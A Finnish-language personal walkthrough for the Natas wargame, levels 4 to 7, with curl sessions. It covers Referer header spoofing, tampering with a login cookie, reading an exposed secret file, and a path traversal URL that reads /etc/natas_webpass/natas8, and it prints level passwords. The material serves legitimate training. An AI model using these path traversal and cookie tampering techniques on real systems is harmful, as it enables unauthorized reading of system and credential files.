# Natas lunttilapput

Eli aikaisempien harjoittuksien kannalta kertyy ja taso menee vaikeammaksi ja vaikeammaksi. Listataan olennaiset tarkistukset, ettei ole vain yht√§ tapaa;

- tarkista sivuston "inspect" eli avaamalla n√§pp√§imist√∂st√§ F12 , tai joko sivustolta oikea hiirell√§ "inspect" - ja katso onko koodissa mit√§√§n `username:password`
  - tarkista onko tiedoston polussa mit√§√§n polkuaja kuten `/file/image.jpg`, eli poista image.jpg , ja mene `/file`- polkuun, ja tarkista onko mahdollista olla .txt tiedostoa tai muuta arkistoa
  - lis√§√§ url polkuun `/robots.txt` , jos ois robots tiedosto, niin siell√§ voi lukea lis√§ vinkkej√§. Todellisuudessaan kaikilla sivustoilla ei ole robots.txt-tiedostoa, koska sen k√§ytt√∂ ei ole pakollista. Jotkut haluavat hakukoneiden indeksoivan kaiken, kun taas toiset eiv√§t tarvitse erityisi√§ rajoituksia. Ilman t√§t√§ tiedostoa hakukoneet voivat silti yritt√§√§ indeksoida kaikki l√∂ydett√§viss√§ olevat sivut, ellei muita estomekanismeja ole k√§yt√∂ss√§.

## curl komentoja

k√§ytett√§√§n -Headeri referenssi√§ , ja t√§ss√§ muutama ovat melko samoja, mutta jotekin se objekti/nimi/muuttuja on eriss√§ j√§rjestyksess√§ mutta idea on sama;

- Ensimm√§isen linkkiss√§ on halutaan menn√§ seuraavaan leveliin, ja j√§lkimm√§isess√§ on nykyinen level ja se level salasansa jonka saattiin selville ja siksi t√§ss√§ lukee (a)natas4-level;  <br>
`$curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- t√§m√§ on sama kuin ylempi, mutta lyhyempi ja tiivistettyn√§ vain -H tarkoittaa header; <br>
`$curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- t√§ss√§kin ekana on toistettaan se nykyinen level ja se salasansa, ett√§ haettaan seuraava leveli; <br>
`$curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org`

### ev√§steen hakeminen

loggin muutettu 0 (false) --> 1 (true)

T√§m√§n komenton suorittamiseen vaattii sen nykyisen levelin salasansa, jotta saa kerr√§tty√§ sen ev√§steet; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt` 

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                                                        
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        0
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                         
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        1
```

Ylemm√§n muutettun loggin=1:seksi, niin sitten suoritettaan ja haettaan sit√§ seuraavan levelin salasannsa; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b "natas5_cookie.txt"`

# level 6 - START HERE

En ois uskonut t√§m√§ level 6 oli/on helppoa, ett√§ piti selvitt√§√§ toi salainen koodi tuohon kentt√§√§n ja sitten kertoo sen seuraavan levelin 7 salasansa.

Ensimm√§inen kirjauduttua level 6 - ett√§ selvitett√§√§n toi salainen koodi , niin p√§√§st√§√§n eteenp√§in.

![alt text](./kuvat-level6-10/level6-0.png)

Ensimm√§isen√§ tarkistettaan koodit, ett√§ n√§ytt√§√§ normaalilta ja on t√§m√§n level 6 ja sen salasansa kirjauttuminen

![alt text](./kuvat-level6-10/level6-1.png)

Seuraavaksi meit√§ kiinnostaa toi "View sourcecode" (ylemm√§n kuvan mukaan) niin se ainakin ohjaisi toiselle sivustolle. T√§m√§ on kuin toinen polku tiedosto/sivusto. T√§m√§n keksimm√§inen osuus (alempi kuva) on kodaattu jollaki PHP-koodikielell√§, ett√§ HTMl tukee sen. Sitten seuraavista meit√§ kiinnostaa toi polku `includes/secret.inc`

![alt text](./kuvat-level6-10/level6-2.png)

T√§ss√§ n√§hd√§√§n se salainen koodi n√§ytt√§v√§n se on t√§m√§n polun alla, eli kopsaa se ja liitt√§ takaisin Natas level 6:sen etusivuun.

![alt text](./kuvat-level6-10/level6-3.png)


![alt text](./kuvat-level6-10/level6-4.png)

Sitten ja _voila_ , t√§ss√§ on ratkaistettu level 7:n seuraava salasansa. En ois uskonut n√§in helppoa, mutta t√§ss√§ pit√§√§ tarkistaa tosi huolella ja menn√§ v√§h√§ step by step ja just aikaisempien harjoittuksien mukaan. My√∂s tarkistinkin polun `/robots.txt` - ett√§ sellaistakaan ei ole olemassa, ja siksi en lis√§nnyt sit√§ t√§nne.

![alt text](./kuvat-level6-10/level6-5.png)


Mini yhteenvetona t√§ss√§ ei tarvittu tuota Kali linux terminaali, mutta voi hyvinkin katsoa miten t√§t√§ oltaisi voittu ratkaista.

## level 6 - 1 Kali Linux version - START HERE

T√§ss√§ steppiss√§ menn√§√§n Kali linux kautta, mutta ylemmiss√§ mentiin suorttaan sivustojen kautta ja k√§ytt√§en pient√§ salapoliisity√∂t√§, mutta idea on sama ja mentiin mutkan kautta. Harjoitus tekee aina mestariksi, ett√§ hyv√§ steppi.

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**t√§m√§ on tarkistus HTTP-vastaus koodia** , ett√§ t√§m√§ ensimm√§isen√§;

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -I -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Fri, 02 May 2025 07:15:48 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "b75-6326d4351c6fc"
Accept-Ranges: bytes
Content-Length: 2933
Vary: Accept-Encoding
Content-Type: text/html
```

Jotenkin oikealla j√§ljill√§ ja sekalaista html koodia n√§ytt√§v√§ns√§ ja t√§ss√§ on mukana PHP-koodikielt√§, eli sama kuin selaimessa ja siksi toistumisessa n√§ytt√§√§ tosi sekavalta..

**OPTION2-komento** ja sama idea; `$curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org/index-source.html
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>
```

ainakin ylemm√§ss√§ sekalaisessa koodikieless√§ ainakin pist√§√§ ilmiins√§ on toi **"includes/secret.inc"** - sana. T√§m√§ on se just mik√§ meit√§ kiinnostaa nyt, ja meid√§n pit√§√§ selvitt√§√§ se ja mihin se voisii johtaa.

Ehk√§ osalle tai jonkun mielest√§ se voi johtaa seuraavaa polkua eli **`/index-source.html/includes/secret.inc`** , mutta ei, se on yksitt√§inen polku, ett√§ joudutaan kumota polku `/index-source.html`.

Eli ratkaisuksi menee n√§in (alemman komennon mukaan), ja t√§m√§ on se se salainen koodi, jonka halutaan tiet√§√§.

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~] 
‚îî‚îÄ$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc 
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

```

Sitten t√§t√§ koodia pit√§√§ sijoittaa siihen formaatti kentt√§√§n, eli joudutaan palata siihen etusivulle. Tuossa formaatti funktiossa `<form method=post>` ja p√§√§ttyv√§√§n formaattiin `</form>`, `name=secret`.


```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org                  
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```

Nyt jouduttaan k√§ytt√§√§ HTTP-protokollassa POST, PUT, DELETE ja muut vastaavat metodit ovat tapa suorittaa erilaisia toimintoja verkkosivujen ja API:iden kanssa. `curl` komentoa voi l√§hett√§√§ HTTP-pyynt√∂j√§, kuten POST ja PUT, suoraan komentorivilt√§, joten k√§ytett√§√§n t√§t√§ ja testataan.

HTML-lomakkeeseen curl-komennolla, koska sivu k√§ytt√§√§ POST-metodia lomakekenttien k√§sittelyyn.

nyt kokeillaan sijoittaa toi salainen koodi "FOEIUWGHFEEUHOFUOIU" vastaus tuohon **Input secret** kent√§√§n.

**T√ÑM√Ñ ON MALLI:**
*mit√§ t√§ss√§ oikein tapahtuu?* 

- -X POST m√§√§ritt√§√§, ett√§ k√§ytet√§√§n HTTP POST -pyynt√∂√§.
- -d "secret=LoremIpsum&submit=Submit" l√§hett√§√§ lomaketietona secret-kentt√§√§n arvon LoremIpsum ja painaa "submit"-painiketta.
- -H "Referer: ..." asettaa Referer-otsikon, joka voi olla tarpeellinen p√§√§syn varmistamiseksi.
- -u "natas6:..." lis√§√§ k√§ytt√§j√§tunnuksen ja salasanan autentikaatioon.

`$curl -X POST -d "secret=LoremIpsum&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`



Nyt n√§ytt√§√§ ainakin pelitt√§v√§n ja n√§in saattiin toi level 7:n salasansa 

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

---
---

# Level 7 - START HERE;

Perus ensimm√§isen√§ ja t√§ss√§ n√§kyviss√§ on pari seuraavaa sivua, jotka toimivat kuin "etusivu" ja "about"-sivustoa.

![alt text](./kuvat-level6-10/level7-0.png)

![alt text](./kuvat-level6-10/level7-1.png)

![alt text](./kuvat-level6-10/level7-2.png)

T√§ss√§ avattua F12/"Inspect" - sivuston koodista, ett√§ n√§ytt√§√§ on jotakin vinkkej√§ riviss√§ 21, ett√§ mene polkuun `/etc/natas_webpass/natas8` , joka kertoo level 8 - salasanansa.

![alt text](./kuvat-level6-10/level7-3.png)

Kokeilin sijoittaa ton vihjeen `/etc/natas_webpass/natas8` - mukaan niin ainakin kertoi v√§h√§ lis√§tietoa, ett√§ ettei l√∂yd√§ kyseist√§ polkua, ja konffauksessa on jotakin error:ia. 

![alt text](./kuvat-level6-10/level7-4.png)

**Mit√§ neuvoksi ja mik√§ on ratkaisu?** <br>
Otettiin noita tiedoston ja/tai polkujen tietoja yl√∂s eli `/var/www/natas/natas7/index.php` sivuston mukaisesti, ett√§ huomataan t√§llainen polku ja meit√§ vihjen√§ oli "`/etc/natas_webpass/natas8`" - ett√§ t√§st√§ saisi level 8:nen salasansa, mutta miten?

T√§ss√§ tason leveliss√§ harjoituksessa on tapahtuu ja yritett√§√§n selvitt√§√§ sen **hakemistorakenteen manipulointia** tai jopa **path traversal -haavoittuvuutta**. Kertauksena `/etc/` t√§m√§ on **tiedostopolku** hakemistonsa. Periaatteessa meid√§n pit√§√§ muuttaa t√§ss√§ harjoituksessa t√§m√§n `/var/www/natas/natas7/` - polku rakenne muuttaa `../../`:ksi, koska k√§ytt√§m√§ll√§ `../../../../`-merkint√§√§ polussa pyrit√§√§n siirtym√§√§n ylemmille hakemistotasoille, mik√§ on tyypillinen path traversal -haavoittuvuuden hy√∂dynt√§mistapa. T√§m√§ tapahtuu silloin, kun verkkosovellus ei rajoita tai puhdista k√§ytt√§j√§n antamaa polkua asianmukaisesti, mahdollistaen sen manipuloinnin.

Jos esimerkiksi verkkosivu sallii k√§ytt√§j√§n sy√∂tt√§√§ tiedoston polun **input-parametrina**, eik√§ se validoi polkua oikein, hy√∂kk√§√§j√§ voi yritt√§√§ p√§√§st√§ ulos rajoitetusta hakemistosta ja navigoida j√§rjestelm√§n kriittisiin tiedostoihin, kuten `/etc/passwd`, joka sis√§lt√§√§ k√§ytt√§j√§tiedot. T√§llainen manipulointi voi johtaa arkaluonteisten tietojen paljastumiseen tai jopa luvattomaan p√§√§syyn.

Path traversal on yksi yleisimmist√§ **web-sovellusten tietoturvahaavoittuvuuksista**, ja sen tunnistaminen on t√§rke√§ osa penetraatiotestausta ja tietoturvaa.

**Joten ratkaisuna;** <br>
Sijoitin URl polkuun v√§liin muutaman `../` polku rakenteen ja k√§ytt√§en "/Home/" kotisivun hy√∂dynt√§√§kseen loppua. Siksi tuli n√§in: `natas7.natas.labs.overthewire.org/index.php?page=home../../../../../../etc/natas_webpass/natas8`

![alt text](./kuvat-level6-10/level7-5.png)

Ja viimeisen√§ _voila_ ja siin√§ on level 8:nen salasansa ja n√§in p√§√§stiin selvitetty√§ ja ratkaistettua.

**Tarkastuksena;** <br>
T√§m√§ on se yksi toimiva polku linki : `natas7.natas.labs.overthewire.org/index.php?page=home../../../../../../etc/natas_webpass/natas8` <br>
T√§ss√§ tiedostojen polussa on jokinlainen laskenta, ett√§ t√§ss√§ mukaan on 6 tasoa yl√∂sp√§in `../../../../../../` ennen siirtymist√§ `/etc/natas_webpass/natas8` tiedostoon. 

- Kun tarkastellaan `home../`, t√§ss√§ tapahtuu yl√∂sp√§in siirtyminen, mutta muotoilu vaikuttaa puutteelliselta:
  - 1Ô∏è‚É£ `home../` ei ole t√§ysin oikea syntaksi, koska `../` tulisi yleens√§ erottua hakemistosta, kuten `home/../`
  - 2Ô∏è‚É£ Jos `home` on hakemisto, sitten `../` tarkoittaa siirtymist√§ sen yl√§puoliseen hakemistoon.
    
`/home../` niin toi home sana voi j√§tt√§√§ v√§liins√§, ett√§ valinnaisena se voi toki olla mukana, mutta silti saattaa tuottaa pient√§ h√§m√§yst√§kin url:issa. T√§st√§ syyst√§ URL-manipulaatioissa ja path traversal -hy√∂kk√§yksiss√§.

Siksi t√§ss√§ k√§ytett√§√§n `../../../../../../`-merkint√§√§, se korvaa hakemistopolun ja siirt√§√§ navigointia yl√∂sp√§in. Esimerkiksi polun vinkki√§ ja sit√§ sivun tarjoamaa vihjett√§ siksi t√§m√§ polku tiedostonhakemisto `/var/www/natas/natas7/index.php` voi toimia normaalina reitityksen√§, mutta jos palvelin ei rajoita polun manipulointia, **path traversal -haavoittuvuutta** esille ja laskennassa molemmissa on **6 tasoa yl√∂sp√§in**.

![alt text](./kuvat-level6-10/level7-6.png)

Sek√§ periaatteessa molemmat kelpaa vastaukseen, ett√§ ylempi tai alempi vaihtoehto ja molempiakin sallittaan ja toimii.

Options 2 toimiva polku linkki; `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8`

![alt text](./kuvat-level6-10/level7-7.png)

# Level 7 - 1 - Kali Linux version - START HERE;

natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

- t√§m√§ voi olla itselleni yleisin k√§ytt√∂ `curl` - komento; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org`

- toisena ehk√§ t√§m√§ on parempi, mutta sama idea, ett√§ hakee headerins√§, ja sitten -u (ssh k√§yttiksen) `username:password`, ja sitten se URL polku `/index.html` ja jne; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


**samat tarkoittavat polu**, mutta menin vain mutkalla, mutta periaatteessa alemmat kolmet on samaa tarkoittavaa <br>
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=home
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=about"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

**seuraavaksi** testataan toi ohje/vinkki natas8 salasansa - START HERE;

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
<br />
<b>Warning</b>:  include(home/etc/natas_webpass/natas8): failed to open stream: No such file or directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'home/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

# Level 7 - 2 lis√§tietoa ja pient√§ teoriaa;

## Hakemistorakenteen manipulointi Natas7-haasteessa

Kun k√§sittelet tiedostopolkujen manipulointia, `"../"` tarkoittaa siirtymist√§ hakemistossa yl√∂sp√§in. Jos olet `/var/www/natas/natas7/index.php` -polussa ja haluat p√§√§st√§ k√§siksi tiedostoon `/etc/natas_webpass/natas8`, sinun t√§ytyy nousta hakemistorakenteessa riitt√§v√§n monta tasoa yl√∂sp√§in ja sitten navigoida oikeaan kohteeseen.

## Polun selitys
- `/var/www/natas/natas7/index.php` on alkuper√§inen sijainti.
